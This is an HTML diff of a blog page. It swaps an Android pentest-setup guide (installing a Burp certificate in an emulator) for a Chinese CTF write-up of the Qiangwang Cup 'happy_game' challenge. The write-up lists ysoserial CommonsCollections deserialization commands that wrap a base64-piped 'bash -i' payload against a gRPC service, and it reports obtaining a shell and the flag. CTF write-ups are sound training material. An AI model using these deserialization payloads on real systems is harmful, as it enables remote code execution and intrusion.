@@ -22,7 +22,7 @@
 
   
 
-  <title>安卓渗透测试环境搭建 | Baron&#39;s Blog</title>
+  <title>强网杯-Web-happy_game | Baron&#39;s Blog</title>
 
   
 
@@ -102,17 +102,12 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">安卓渗透测试环境搭建</h1>
+          <h1 class="title-wrap">强网杯-Web-happy_game</h1>
           <h2 class="title-sub-wrap">
             <strong>Baron</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2023-10-03T05:34:18.118Z" itemprop="datePublished">2023-10-03</time>
+            <time  class="article-date" datetime="2023-12-18T06:40:47.000Z" itemprop="datePublished">2023-12-18</time>
           </h2>
-          
-            <h2 class="last-time">
-              <span>最后更新于</span>
-              <time  class="article-updated" datetime="2023-10-09T09:15:21.231Z" itemprop="dateUpdated">2023-10-09</time>
-            </h2>
           
           
           <ul class="wrap-list dark">
@@ -144,30 +139,26 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="安卓渗透测试环境搭建"><a href="#安卓渗透测试环境搭建" class="headerlink" title="安卓渗透测试环境搭建"></a>安卓渗透测试环境搭建</h1><h4 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h4><p>openssl：提供证书相关操作</p>
-<p>雷电模拟器：提供安卓环境</p>
-<p>Burpsuite：渗透测试抓包工具</p>
-<h4 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h4><h5 id="0x01-获得bp的证书"><a href="#0x01-获得bp的证书" class="headerlink" title="0x01 获得bp的证书"></a>0x01 获得bp的证书</h5><p>访问bp中设置的地址即可获得证书 cacert.der</p>
-<p><img src="/../images/image-20231003010552628.png" alt="image-20231003010552628"></p>
-<h5 id="0x02-转换证书为pem"><a href="#0x02-转换证书为pem" class="headerlink" title="0x02 转换证书为pem"></a>0x02 转换证书为pem</h5><p>计算hash值&amp;生成pem文件&amp;生成.0文件</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -in cacert.der -out cacert.pem</span><br><span class="line">生成pem文件</span><br><span class="line">openssl x509 -inform PEM -subject_hash_old -in cacert.pem</span><br><span class="line">第二条命令看得到的hash值，重命名pem文件为 得到的hash值.0</span><br></pre></td></tr></table></figure>
+        <h2 id="题目详解-web-happygame"><a href="#题目详解-web-happygame" class="headerlink" title="题目详解-web-happygame"></a>题目详解-web-happygame</h2><p>题目测试</p>
+<p><img src="/pic/image-20231217120646215.png" alt="image-20231217120646215"></p>
+<p>可以发现是一个输入和输出的界面，采用hexdump的形式，对用户输入的数据进行处理，输出16进制下的字符。</p>
+<p>观察一个返回数据的细节如下：</p>
+<p><img src="/pic/image-20231218143750109.png" alt="image-20231218143750109"></p>
+<p>出现了<code>HTTP/2</code>的协议信息提示，而gRPC使用HTTP&#x2F;2作为传输协议，因此推测可能存在grpc远程服务，而grpc常见的是反序列化漏洞，使用ysoserial进行反序列化漏洞测试。</p>
+<p>首先用grpcui去连接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grpcui.exe -plaintext 39.106.48.123:31310</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images/image-20231003011744986.png" alt="image-20231003011744986"></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实复制粘贴就行，只要终端输出的内容，终端运行一行代码就够了其实</span><br></pre></td></tr></table></figure>
+<p><img src="/pic/image-20231218144418870.png" alt="image-20231218144418870"></p>
+<p>接着用CC链去发payload：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections1 &quot;bash -c &#123;echo,BASE64加密的payload&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  &gt;test.bin</span><br><span class="line"></span><br><span class="line">java -jar ysoserial-all.jar CommonsCollections2 &quot;bash -c &#123;echo,BASE64加密的payload&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  &gt;test.bin</span><br><span class="line"></span><br><span class="line">java -jar ysoserial-all.jar CommonsCollections3 &quot;bash -c &#123;echo,BASE64加密的payload&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  &gt;test.bin</span><br><span class="line"></span><br><span class="line">java -jar ysoserial-all.jar CommonsCollections4 &quot;bash -c &#123;echo,BASE64加密的payload&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  &gt;test.bin</span><br><span class="line"></span><br><span class="line">java -jar ysoserial-all.jar CommonsCollections5 &quot;bash -c &#123;echo,BASE64加密的payload&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  &gt;test.bin</span><br><span class="line"></span><br><span class="line">java -jar ysoserial-all.jar CommonsCollections6 &quot;bash -c &#123;echo,BASE64加密的payload&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  &gt;test.bin</span><br><span class="line"></span><br><span class="line">java -jar ysoserial-all.jar CommonsCollections7 &quot;bash -c &#123;echo,BASE64加密的payload&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  &gt;test.bin</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../images/image-20231003011906360.png" alt="image-20231003011906360"></p>
-<h5 id="0x03-导入证书"><a href="#0x03-导入证书" class="headerlink" title="0x03 导入证书"></a>0x03 导入证书</h5><p>i. 开启雷电模拟器的system可以写入权限和root权限（踩坑，一定记得开System.vmdk可以写入权限，不然导入不了证书，写入会被积极拒绝）【题外话：雷电模拟器也是为了加快运行才加了这个默认限制，大家轻一点喷】</p>
-<p><img src="/../images/image-20231003012501105.png" alt="image-20231003012501105"></p>
-<p>ii. 导入证书</p>
-<p>复制粘贴 Hash值.0文件到 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;。图里面是用的MT管理器，这里大家可以各显神通，adb shell传进去也行。</p>
-<p><img src="/../images/image-20231003012725150.png" alt="image-20231003012725150"></p>
-<h5 id="0x04-配置代理"><a href="#0x04-配置代理" class="headerlink" title="0x04 配置代理"></a>0x04 配置代理</h5><p>i. 在BP中绑定监听的IP（你主机有网的那个IP，不够严谨，初学者记得是有网的那个IP就行）。</p>
-<p><img src="/../images/image-20231003012127291.png" alt="image-20231003012127291"></p>
-<p>ii. 在手机系统设置中设置代理到，BP中设置的IP和端口即可。</p>
-<p><img src="/../images/image-20231003012252080.png" alt="image-20231003012252080"></p>
-<h5 id="0x05-Done-抓包测试"><a href="#0x05-Done-抓包测试" class="headerlink" title="0x05 Done - 抓包测试"></a>0x05 Done - 抓包测试</h5><p>这里演示一下抓包U净的接口</p>
-<p><img src="/../images/image-20231003013225392.png" alt="image-20231003013225392"></p>
-<p>到此就结束了，希望搭环境过程一路顺风。</p>
+<p>返回helloworld，应该是植入成功了？</p>
+<p><img src="/pic/image-20231218144800468.png" alt="image-20231218144800468"></p>
+<p>看一下有没有拿到shell，成功拿到shell</p>
+<p><img src="/pic/image-20231218144817703.png" alt="image-20231218144817703"></p>
+<p><img src="/pic/image-20231218144834560.png" alt="image-20231218144834560"></p>
+<p>拿到flag</p>
+<p><img src="/pic/image-20231218144853976.png" alt="image-20231218144853976"></p>
 
       </section>
 
@@ -180,8 +171,8 @@
     
     <div class="card-text">
       
-        <a href="/2023/10/03/%E5%9F%BA%E7%A1%80%E5%AE%9E%E9%AA%8C/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">基础实验</h2>
+        <a href="/2023/12/18/wp-%E5%BC%BA%E7%BD%91%E6%9D%AF-Misc-PyjailmyReveng/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">wp-强网杯-Misc-PyjailmyReveng</h2>
         </a>
       
       <div class="card-text--row">Newer</div>
@@ -195,8 +186,8 @@
     
     <div class="card-text">
       
-        <a href="/2023/10/03/hello-world/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">Hello World</h2>
+        <a href="/2023/11/21/%E6%81%AD%E5%96%9C%E4%BD%A0%E8%8E%B7%E5%BE%97%E5%B9%BF%E5%91%8A-%E5%BC%B9%E7%AA%97%E9%9D%99%E9%BB%98%E5%8D%A1/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">恭喜你获得广告_弹窗静默卡</h2>
         </a>
       
       <div class="card-text--row">Older</div>
